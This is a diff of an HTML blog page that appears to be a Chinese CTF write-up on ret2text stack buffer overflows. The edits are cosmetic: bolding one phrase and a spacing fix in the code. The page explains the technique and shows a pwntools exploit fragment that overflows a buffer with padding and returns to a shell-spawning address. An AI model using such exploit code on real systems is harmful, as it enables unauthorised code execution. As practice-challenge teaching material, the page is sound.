@@ -290,7 +290,7 @@
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">ctfwiki上的介绍</a></p>
 <span id="more"></span>
 
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2text 即<strong>控制程序执行程序本身已有的的代码</strong> (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
 <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
 <hr>
 <h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="ret2text-（from-NISA内部新生赛）"><a href="#ret2text-（from-NISA内部新生赛）" class="headerlink" title="ret2text （from NISA内部新生赛）"></a>ret2text （from NISA内部新生赛）</h2><p>拿到附件</p>
@@ -416,7 +416,7 @@ io <span class="token operator">=</span> remote<span class="token punctuation">(
 <span class="token comment">#context.log_level = "debug"</span>
 offset <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x8</span>
 binsh_addr <span class="token operator">=</span> <span class="token number">0x400726</span>
-payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
+payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
 
 io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'-10000'</span><span class="token punctuation">)</span>
